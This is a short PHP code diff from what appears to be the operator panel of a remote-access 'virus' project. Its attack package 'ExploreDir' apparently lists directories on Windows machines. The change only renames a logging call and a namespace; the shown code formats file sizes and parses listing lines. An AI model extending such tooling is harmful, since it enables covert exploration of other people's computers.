@@ -1,7 +1,7 @@
 <?php
 
 use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir;
-use Kelvinho\Virus\Logs;
+use Kelvinho\Virus\Singleton\Logs;
 use function Kelvinho\Virus\map;
 
 function niceSize(int $bytes): string {
@@ -17,7 +17,7 @@ function niceSize(int $bytes): string {
         }
         $index += 1;
     }
-    Logs::unreachable("ExploreDir admin page, niceSize");
+    Logs::unreachableState("ExploreDir admin page, niceSize");
     return "";
 }
 
@@ -66,7 +66,7 @@ process 0d2, given depth 0 by hand, no prev, reads, echos. Loops
 function processLine($handle, int $givenDepth, array &$path, string $unprocessedLine = null): ?string {
     if ($unprocessedLine != null) {
         if (empty(trim($unprocessedLine))) {
-            Logs::unreachable("ExploreDir package, admin screen");
+            Logs::unreachableState("ExploreDir package, admin screen");
         }
         $lineDepth = (int)explode(";", $unprocessedLine)[0];
         if ($lineDepth < $givenDepth) {
@@ -126,7 +126,7 @@ function processLine($handle, int $givenDepth, array &$path, string $unprocessed
             }
             return "";
         default:
-            Logs::unreachable("ExploreDir package, admin screen, f|d");
+            Logs::unreachableState("ExploreDir package, admin screen, f|d");
             return null;
     }
 }
